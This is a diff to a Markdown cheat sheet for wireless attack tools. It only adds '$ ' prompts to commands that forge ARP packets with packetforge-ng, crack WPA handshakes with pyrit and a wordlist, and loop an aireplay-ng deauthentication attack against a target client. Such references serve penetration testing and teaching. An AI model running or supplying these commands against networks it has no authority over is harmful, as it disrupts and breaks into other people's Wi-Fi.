@@ -210,7 +210,7 @@ Additional example:
   - `-y` XOR file to read the PRGA from
   - `-w` Write to file
 ```bash
-packetforge-ng -0 -a ap_mac -h our_mac -k 255.255.255.255 -l 255.255.255.255 -y file.xor -w arp-request
+$ packetforge-ng -0 -a ap_mac -h our_mac -k 255.255.255.255 -l 255.255.255.255 -y file.xor -w arp-request
 ```
 
 ### pyrit
@@ -218,25 +218,25 @@ packetforge-ng -0 -a ap_mac -h our_mac -k 255.255.255.255 -l 255.255.255.255 -y 
 
 Analyze a packet capture file.
 ```bash
-pyrit -r capture.cap analyze
+$ pyrit -r capture.cap analyze
 ```
 
 Import passwords from a file into the database.
 ```bash
-pyrit -i /usr/share/wordlists/spy_vs_spy.words import_passwords
+$ pyrit -i /usr/share/wordlists/spy_vs_spy.words import_passwords
 ```
 Create a new ESSID (or `-b` for BSSID) into the database.
 ```bash
-pyrit -e "access_point" create_essid
+$ pyrit -e "access_point" create_essid
 ```
 Batch process the database.
 ```bash
-pyrit batch
+$ pyrit batch
 ```
 
 Attack all handshakes from the database.
 ```bash
-pyrit -r capture.cap --all-handshakes attack_db
+$ pyrit -r capture.cap --all-handshakes attack_db
 ```
 
 ### wifite
@@ -246,7 +246,7 @@ pyrit -r capture.cap --all-handshakes attack_db
 ### Loops
 Loop deauthentication attack to target client.
 ```bash
-for s in `seq 1 1000`; do sleep 1 && aireplay-ng -0 1 -e ap_name -a ap_mac -c <number> wlan0mon; done
+$ for s in `seq 1 1000`; do sleep 1 && aireplay-ng -0 1 -e ap_name -a ap_mac -c <number> wlan0mon; done
 ```
 
 ### Regex
